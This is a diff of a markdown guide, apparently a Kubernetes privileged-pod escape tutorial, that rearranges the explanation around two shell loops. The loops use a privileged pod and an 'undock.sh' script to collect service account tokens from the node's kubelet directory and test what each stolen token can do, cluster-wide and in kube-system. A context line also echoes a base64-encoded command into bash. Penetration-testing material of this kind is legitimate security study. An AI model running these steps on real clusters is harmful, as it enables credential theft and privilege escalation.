@@ -369,15 +369,7 @@ kubectl exec -it priv-exec-pod -- bash -c "echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9m
 
 **Run kubectl can-i --list against ALL tokens found on the node**
 
-Run this where you have kubectl installed, and NOT from within the priv pod. 
-
-This is what the following command does:
-* From outside the pod, you execute `kubectl exec`, and use undock.sh to find all of the token locations on the host
-* You then iterate through the list of filenames, and
-  * Print the token location
-  * Run `kubectl auth can-i list` using each token via the `--token` command line argument.  
-
-
+*Run this where you have kubectl installed, and NOT from within the priv pod.* 
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
 for filename in $tokens; \
@@ -388,12 +380,19 @@ echo -n "What can I do? "; \
 kubectl --token=$tokena auth can-i --list; echo; echo; echo; \
 done
 ```
-
-This gives you a list of the actions each token can perform cluster wide. 
-The next command will do the same thing, but just in the kube-system namespace.
+This is what just happened:
+* From outside the pod, you execute `kubectl exec`, and use undock.sh to find all of the token locations on the host
+* You then iterate through the list of filenames, and
+  * Print the token location
+  * Run `kubectl auth can-i list` using each token via the `--token` command line argument.  
+* This gives you a list of the actions each token can perform cluster wide. 
+  
+The next command will do the same thing, but just in the kube-system namespace. 
 
 
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
+
+*Run this where you have kubectl installed, and NOT from within the priv pod.*
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
 for filename in $tokens; \
